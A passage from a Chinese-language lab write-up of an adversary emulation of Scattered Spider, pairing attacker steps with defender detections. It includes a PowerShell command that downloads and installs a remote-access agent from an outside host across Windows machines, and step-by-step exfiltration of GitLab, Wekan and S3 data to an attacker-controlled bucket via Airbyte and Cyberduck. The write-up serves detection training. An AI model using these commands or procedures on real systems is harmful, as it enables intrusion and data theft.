      curl.exe -o "C:\Program Files\TacticalAgent\tacticalrmm.exe" http://kingslanding-rmm.com:8080/files/rmmagent.exe
      & "C:\Program Files\TacticalAgent\tacticalrmm.exe" -m install --api https://api.kingslanding-hr.com/ --client-id 1 --site-id 1 --agent-type workstation --auth 9d4300356866ed107.... --insecure
  }
  Write-Host "Attempted to run TacticalAgent on host"
}
```

![image-20260329150935000](assets/image-20260329150935000.png)



在「目標選擇」中選擇「手動選擇執行個體」。點選搜尋欄，選擇「平台類型」，然後選擇「Windows」，在篩選後選取所有剩餘的目標。在「輸出選項」中取消勾選「啟用 S3 儲存桶」，然後按「執行」。在命令 ID 頁面，於「取消命令」按鈕旁點選箭頭以重新整理狀態，直到命令完成。向下捲動並點選目標 `fishmonger (10.55.4.102)` 的 ID，以檢查輸出的結尾。

![image-20260329151256603](assets/image-20260329151256603.png)

![image-20260329151431748](assets/image-20260329151431748.png)

 切換到 TacticalRMM 儀表板，並在系統管理工作站 `fishmonger (10.55.4.102)` 上連線到 Tactical RMM 工作階段：在代理程式上按右鍵並選擇 `Take Control` 

![image-20260329152326724](assets/image-20260329152326724.png)

在新視窗按下 `Connect` 按鈕，最後選擇 `Active, RDP-TCP#0 - kingslanding/atargaryen` 。

![image-20260329152449127](assets/image-20260329152449127.png)

### Defender

攻擊者使用了 ws_tunnel 連接到 atatgaryen 的機器，因此可以查看一下 atatgaryen 機器的 `/var/log/auth.log`，以下紀錄可以看到來自 10.212.3.108 的連線進來，另外後面還執行了查看 abctl 狀態與 Credentials ，因此可以判定這是由攻擊者透過 ws_tunnel 從 goldroad (10.212.3.108 )連進 atatgaryen 紀錄

![image-20260329233820975](assets/image-20260329233820975.png)

另外攻擊者使用了 aws_comsoler 帳號在Systems Manager 下傳輸了 powershell 指令，因此可以在 AWS CloudWatch 下看到 SendCommand 的行為證明攻擊者在instance 下了 powershell 指令

![image-20260329154849681](assets/image-20260329154849681.png)

而下的powershell 指令為下載 TaticallMM.exe ，他會在 Windows 受害機上`fishmonger (10.55.4.102)`創建服務，因此可以使用 System Event ID 7045 偵測到 Winwdos 受害機上`fishmonger (10.55.4.102)` 運行了惡意服務

![image-20260329212226569](assets/image-20260329212226569.png)



---

## Step 7 - Collection and Exfil

> 在連線至 fishmonger IP 位置 10.55.4.102 的 Tactical RMM 連線階段中，Scattered Spider 存取了 Airbyte 入口網站，利用 AWS 金鑰新增了一個 S3 作為目的地，並將 GitLab 與 Wekan 的資料同步至攻擊者控制的 S3 儲存體中。接下來，在 fishmonger IP 位置 10.55.4.102 上安裝並使用 Cyberduck，以連線並在 Amazon 檔案共用服務中搜尋感興趣的檔案。這些檔案最終會被資料外洩至攻擊者所控制的 S3 儲存體中。

![SS_Step7.png](https://attackevals.github.io/ael/enterprise/scattered_spider/resources/assets/ss_step7.png)

### Attacker 模擬

 在以 `fishmonger (10.55.4.102)` 的 Tactical RMM 會話中，開啟 FireFox 並瀏覽至 Airbyte 入口網站，使用 `tlannister@kingslanding.net` 的憑證登入。

![image-20260329195203801](assets/image-20260329195203801.png)

回到 Kali，在終端機中取得攻擊者的 S3  Access Key 與 Secret Access Key
在 TacticalRMM 代理程式視窗左下角，點擊以開啟剪貼簿。從 Kali 主機上的 csv 複製並貼上取得的 `Access key ID` 。將「Access Key ID」欄位設定為剪貼簿中貼上的金鑰。對「Secret Access Key」欄位重複剪貼簿的複製程序，將 `Secret access key` 貼入該欄位將「S3 bucket name」設為 `REPLACE_WITH_ATTACKER_S3_BUCKET_NAME` 、「S3 Bucket Path」設為 `databackup` ，以及「S3 Bucket Region」設為 `us-east-1` 。將格式設定為「CSV」以儲存資料，然後儲存新的 S3 目的地。點擊「Set up destination」會觸發「Test the destination」。當收到「All Connections have passed」後，你應該會自動被重新導向到你的新連線「Weekly backup」。

![image-20260329201955957](assets/image-20260329201955957.png)

在 Airbyte 入口網站中，前往「Connections」分頁並按下「+ New Connection」按鈕。選擇「Select an existing source」，然後從預先設定的來源清單中選擇 GitLab。在「Define Destination」頁面，選擇「Select an existing destination」，接著選擇先前建立的名為「Weekly backup」的 S3 目的地。等候 Airbyte 完成連線測試與資料結構分析。 在「Select streams」頁面，勾選方框以選取所有結構物件，並取消選取 `epic_issues` 與 `epics` ，然後按「Next」。將連線名稱更改為 `Gitlab to S3` ，同步頻率選擇「manual」，其他選項維持預設。按下「Set up connection」按鈕，然後點選「sync now」開始同步。等候同步完成，這可能需要幾分鐘。

![image-20260329202455192](assets/image-20260329202455192.png)

返回 AirByte 入口網站的「Connections」分頁，然後點擊「+ New Connection」按鈕。選擇「Select an existing source」，接著從預先設定的來源清單中選取 mongoDB。在「Define Destination」頁面，選擇「Select an existing destination」，然後選取先前建立的名為「Weekly backup」的 S3 目的地。等待 AirByte 完成連線測試與資料結構分析。在「Select streams」頁面，勾選方框以選取所有資料結構物件，然後點擊「Next」。將連線名稱更改為 `Wekan to S3` ，同步頻率選擇「manual」，其他選項保持預設。點擊「Set up connection」按鈕，然後點選「sync now」開始同步。等待同步完成，這可能需要幾分鐘。部分欄位可能會顯示「Queued for next sync」，這是正常的。

![image-20260329202653923](assets/image-20260329202653923.png)

在新的瀏覽器分頁中，前往並下載 Cyberduck。打開「下載」資料夾並雙擊 Cyberduck 安裝程式，若出現提示則點選「執行」。在 Cyberduck 安裝視窗中，點選「安裝」。當視窗顯示「安裝成功完成」時，點選關閉。

![image-20260329202752463](assets/image-20260329202752463.png)

搜尋並開啟 Cyberduck，然後點擊左上角的「開啟連線」按鈕。在下拉選單中選擇「Amazon S3」，接著在 Access Key ID 和 Secret Access Keys 欄位輸入在步驟 4 為 `ahightower` 所建立的存取金鑰。點擊展開「更多選項」，在「路徑」欄位輸入 `REPLACE_WITH_VICTIM_S3_BUCKET_NAME` 。最後，點選「連線」。

![image-20260329203405185](assets/image-20260329203405185.png)

使用 Cyberduck 展開所有目錄以檢視檔案內容，檢視完成後將所有目錄摺疊起來。

![image-20260329203720181](assets/image-20260329203720181.png)

回到 Kali，取得攻擊者的 S3 Access Key 與 Secret Access Key。回到 Cyberduck，輸入 Access Key ID 與 Secret Access Key。點選展開「更多選項」，在「路徑 (Path)」中輸入 `REPLACE_WITH_ATTACKER_S3_BUCKET_NAME` 。最後在右下角點選「連線 (Connect)」。回到有受害者 S3 儲存桶的瀏覽器，按 CTRL+A 選取桶內所有檔案。將選取的檔案從受害者 S3 儲存桶拖放到攻擊者 S3 儲存桶。等待「傳輸 (Transfers)」視窗出現，當狀態顯示「複製完成 (Copy complete)」時關閉。如果檔案沒有立即出現在目的地桶，點選重新整理按鈕以確認檔案已成功傳輸。

![image-20260329204043912](assets/image-20260329204043912.png)

### Defender



攻擊者首先先使用 Tactical RMM 登入 fishmonger host ，在連到 airbyte 平台進行資料竊取。

可以先稍微看一下 airbyte 的 log 

```
docker compose logs --since="2026-03-28" server 2>/dev/null | grep -i "destination\|connection\|sync"
docker compose logs --since="2026-03-28" worker 2>/dev/null | grep -i "destination\|connection\|sync\|job\|s3"
```

在worker 的log 可以很明顯看到呈現了攻擊者成功將 Wekan 資料 exfil 到 attacker S3 bucket2的全過程。

```bash
# Exfil 目標配置
airbyte-worker  | 2026-03-29 12:27:35 INFO i.a.w.t.s.ReplicationActivityImpl(lambda$replicateV2$2):216 - connection 64e98e33-06ff-4568-a44f-57fbbbb3d578, hydrated input: io.airbyte.persistence.job.models.ReplicationInput@6a036625[namespaceDefinition=destination,namespaceFormat=<null>,prefix=,sourceId=72edc9ca-e787-47b8-83a2-5efe23deaaae,destinationId=4cbb01f7-566f-4c8f-b276-830930c8d37b,sourceConfiguration={"queue_size":10000,"database_config":{"database":"wekan","auth_source":"admin","cluster_type":"SELF_MANAGED_REPLICA_SET","schema_enforced":true,"connection_string":"mongodb://10.212.3.111:27017/?directConnection=true&replicaSet=rs0"},"update_capture_mode":"Lookup","discover_sample_size":10000,"initial_waiting_seconds":300,"invalid_cdc_cursor_position_behavior":"Fail sync"},destinationConfiguration={"format":{"flattening":"Root level flattening","format_type":"CSV"},"access_key_id":"**********","s3_bucket_name":"attacker-exfil-081775","s3_bucket_path":"databackup","s3_bucket_region":"us-east-1","secret_access_key":"**********"}......


# 資料來源配置
12:27:35  sourceConfiguration:
           database = wekan
           connection_string = mongodb://10.212.3.111:27017/?directConnection=true&replicaSet=rs0

# Sync 開始
12:27:35  start sync worker. job id: 1 attempt id: 0
12:27:36  Running destination...
12:27:36  destination-s3:0.6.5 write --config destination_config.json --catalog destination_catalog.json
12:27:36  source-mongodb-v2:1.4.3 read --config source_config.json --catalog source_catalog.json

# 被竊取的 7 個 Wekan collections 及寫入路徑
airbyte-worker  | 2026-03-29 12:27:45 destination > INFO main i.a.c.i.d.s.S3ConsumerFactory$Companion(toWriteConfig$lambda$1):299 Write config: WriteConfig{streamName=lockoutSettings, namespace=null, outputBucketPath=databackup, pathFormat=databackup/${NAMESPACE}/${STREAM_NAME}/${YEAR}_${MONTH}_${DAY}_${EPOCH}_, fullOutputPath=databackup/lockoutSettings/2026_03_29_1774787263241_, syncMode=append}
airbyte-worker  | 2026-03-29 12:27:45 destination > INFO main i.a.c.i.d.s.S3ConsumerFactory$Companion(toWriteConfig$lambda$1):299 Write config: WriteConfig{streamName=accessibilitySettings, namespace=null, outputBucketPath=databackup, pathFormat=databackup/${NAMESPACE}/${STREAM_NAME}/${YEAR}_${MONTH}_${DAY}_${EPOCH}_, fullOutputPath=databackup/accessibilitySettings/2026_03_29_1774787263241_, syncMode=append}
airbyte-worker  | 2026-03-29 12:27:45 destination > INFO main i.a.c.i.d.s.S3ConsumerFactory$Companion(toWriteConfig$lambda$1):299 Write config: WriteConfig{streamName=settings, namespace=null, outputBucketPath=databackup, pathFormat=databackup/${NAMESPACE}/${STREAM_NAME}/${YEAR}_${MONTH}_${DAY}_${EPOCH}_, fullOutputPath=databackup/settings/2026_03_29_1774787263241_, syncMode=append}
airbyte-worker  | 2026-03-29 12:27:45 destination > INFO main i.a.c.i.d.s.S3ConsumerFactory$Companion(toWriteConfig$lambda$1):299 Write config: WriteConfig{streamName=tableVisibilityModeSettings, namespace=null, outputBucketPath=databackup, pathFormat=databackup/${NAMESPACE}/${STREAM_NAME}/${YEAR}_${MONTH}_${DAY}_${EPOCH}_, fullOutputPath=databackup/tableVisibilityModeSettings/2026_03_29_1774787263241_, syncMode=append}
airbyte-worker  | 2026-03-29 12:27:45 destination > INFO main i.a.c.i.d.s.S3ConsumerFactory$Companion(toWriteConfig$lambda$1):299 Write config: WriteConfig{streamName=cronJobs, namespace=null, outputBucketPath=databackup, pathFormat=databackup/${NAMESPACE}/${STREAM_NAME}/${YEAR}_${MONTH}_${DAY}_${EPOCH}_, fullOutputPath=databackup/cronJobs/2026_03_29_1774787263241_, syncMode=append}
airbyte-worker  | 2026-03-29 12:27:45 destination > INFO main i.a.c.i.d.s.S3ConsumerFactory$Companion(toWriteConfig$lambda$1):299 Write config: WriteConfig{streamName=announcements, namespace=null, outputBucketPath=databackup, pathFormat=databackup/${NAMESPACE}/${STREAM_NAME}/${YEAR}_${MONTH}_${DAY}_${EPOCH}_, fullOutputPath=databackup/announcements/2026_03_29_1774787263241_, syncMode=append}
airbyte-worker  | 2026-03-29 12:27:45 destination > INFO main i.a.c.i.d.s.S3ConsumerFactory$Companion(toWriteConfig$lambda$1):299 Write config: WriteConfig{streamName=accountSettings, namespace=null, outputBucketPath=databackup, pathFormat=databackup/${NAMESPACE}/${STREAM_NAME}/${YEAR}_${MONTH}_${DAY}_${EPOCH}_, fullOutputPath=databackup/accountSettings/2026_03_29_1774787263241_, syncMode=append}

# 格式
12:27:45  S3 format config: S3CsvFormatConfig{flattening=ROOT_LEVEL, compression=GZIP}

# Streams 開始傳輸
12:27:46  Preparing bucket in destination started for 7 streams
12:27:46  Stream status: STARTED for stream wekan:cronJobs

```



而當攻擊者之後使用 CyberDuck 竊取 S3 buckets 資料，因此可以先看瀏覽器歷史 db 找下載 CyberDuck 線索，

下面的紀錄明顯可以得知在 Downloads 資料夾有下載 CyberDuck 紀錄

![image-20260329210531878](assets/image-20260329210531878.png)

另外在 Security Event ID 11707 可以看到在 fishmonger 這台電腦上有安裝 CyberDuck msi 的紀錄，因此可以證明攻擊者在 fishmonger 上安裝了  CyberDuck

![image-20260329205052762](assets/image-20260329205052762.png)



攻擊者最後利用 CyberDuck 將受害者 S3 的資料進行轉移到攻擊者的S3 上，因此在 AWS CloudWatch 上首先會出現 GetBucketLocation ，偵查對應的 S3 bucket 

![image-20260329205857986](assets/image-20260329205857986.png)

接下來有大量的 ListMultipartUploads 並且目標 bucket皆是攻擊者的 bucketName ， 因此可以證明攻擊者開始將受害者 S3 的資料用拖拉複製檔案的方式傳到攻擊者的 S3 bucket。

![image-20260329205950058的方式](assets/image-20260329205950058.png)

---

## Reference

https://attackevals.github.io/ael/enterprise/scattered_spider/emulation_plan/scattered_spider_scenario
